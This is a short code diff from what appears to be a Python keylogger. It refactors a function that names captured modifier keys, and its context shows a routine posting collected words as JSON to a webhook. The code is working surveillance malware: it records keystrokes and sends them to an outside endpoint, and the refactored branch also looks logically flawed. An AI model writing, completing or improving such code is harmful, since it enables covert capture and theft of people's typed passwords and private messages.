@@ -71,13 +71,17 @@ def send_words_to_webhook():
             requests.post(webhook_url, data=json.dumps(payload), headers={"Content-Type": "application/json"})
 
 def get_key_name(key):
+    key_mapping = {
+        Key.ctrl_l: "Key.ctrl",
+        Key.ctrl_r: "Key.ctrl",
+        Key.alt_l: "Key.alt",
+        Key.alt_r: "Key.alt",
+        Key.shift_l: "Key.shift",
+        Key.shift_r: "Key.shift"
+    }
+
     if isinstance(key, KeyCode):
-        if key == Key.ctrl_l or key == Key.ctrl_r:
-            return "Key.ctrl"
-        elif key == Key.alt_l or key == Key.alt_r:
-            return "Key.alt"
-        elif key == Key.shift_l or key == Key.shift_r:
-            return "Key.shift"
+        return key_mapping.get(key, None)
     else:
         return str(key) if key is not None else None
 
